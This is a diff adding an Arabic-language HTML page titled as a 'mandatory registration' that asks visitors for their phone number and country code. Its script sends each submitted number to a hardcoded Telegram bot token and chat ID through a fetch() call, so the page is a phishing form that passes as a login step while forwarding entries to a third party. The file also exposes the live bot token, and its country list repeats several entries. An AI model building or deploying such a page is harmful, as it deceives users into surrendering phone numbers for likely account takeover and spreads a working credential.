@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل إجباري من خلال رقم هاتفك</title>
+    <script>
+        function sendToTelegram() {
+            var number = document.getElementById("number").value; // الحصول على الرقم من المدخل
+            var countryCode = document.getElementById("countryCode").value; // الحصول على رمز الدولة
+
+            // التحقق من أن الحقل غير فارغ
+            if (number.trim() === "") {
+                alert("الرجاء إدخال الرقم");
+                return;
+            }
+
+            // التحقق من أن الرقم يحتوي فقط على أرقام
+            var regex = /^[0-9]+$/;
+            if (!regex.test(number)) {
+                alert("الرجاء إدخال رقم صحيح فقط.");
+                return;
+            }
+
+            // دمج رمز الدولة مع الرقم
+            var fullNumber = countryCode + number;
+
+            // توكن البوت الخاص بك
+            var token = '7851246905:AAGZC-xSoTCDRk3JEXmQ4vkx3UxGVXBfcZU';
+            var chatId = '7022091399'; // رقم المستخدم أو القناة الخاصة بك
+
+            var message = "الرقم المرسل: " + fullNumber;
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // إرسال الطلب إلى تلغرام
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال الرقم بنجاح إلى تلغرام!");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ في إرسال الطلب: ", error);
+                    alert("حدث خطأ في إرسال الرسالة.");
+                });
+        }
+    </script>
+</head>
+<body>
+    <h2>تسجيل إجباري من خلال رقم هاتفك</h2>
+    <p>الرجاء إدخال رقم هاتفك مع رمز الدولة لتسجيل الدخول</p>
+    <form onsubmit="event.preventDefault(); sendToTelegram();">
+        <label for="countryCode">اختر رمز الدولة:</label>
+        <select id="countryCode" required>
+            <option value="+20">مصر (+20)</option>
+            <option value="+971">الإمارات (+971)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+962">الأردن (+962)</option>
+            <option value="+965">الكويت (+965)</option>
+            <option value="+974">قطر (+974)</option>
+            <option value="+968">عمان (+968)</option>
+            <option value="+973">البحرين (+973)</option>
+            <option value="+212">المغرب (+212)</option>
+            <option value="+213">الجزائر (+213)</option>
+            <option value="+218">ليبيا (+218)</option>
+            <option value="+249">السودان (+249)</option>
+            <option value="+964">العراق (+964)</option>
+            <option value="+961">لبنان (+961)</option>
+            <option value="+963">سوريا (+963)</option>
+            <option value="+972">فلسطين (+972)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+967">اليمن (+967)</option>
+            <option value="+964">العراق (+964)</option>
+            <option value="+20">مصر (+20)</option>
+            <option value="+216">تونس (+216)</option>
+            <option value="+971">الإمارات (+971)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+965">الكويت (+965)</option>
+            <option value="+974">قطر (+974)</option>
+            <option value="+968">عمان (+968)</option>
+            <option value="+973">البحرين (+973)</option>
+            <option value="+253">جيبوتي (+253)</option>
+            <option value="+961">لبنان (+961)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+963">سوريا (+963)</option>
+            <option value="+20">مصر (+20)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+973">البحرين (+973)</option>
+            <option value="+218">ليبيا (+218)</option>
+            <option value="+212">المغرب (+212)</option>
+            <option value="+961">لبنان (+961)</option>
+            <option value="+966">السعودية (+966)</option>
+            <option value="+968">عمان (+968)</option>
+            <option value="+967">اليمن (+967)</option>
+        </select>
+        <br><br>
+        <label for="number">الرجاء إدخال رقم الهاتف:</label>
+        <input type="text" id="number" name="number" required placeholder="أدخل رقم الهاتف هنا فقط" pattern="[0-9]+" title="يرجى إدخال رقم مكون من أرقام فقط">
+        <button type="submit">إرسال</button>
+    </form>
+</body>
+</html>
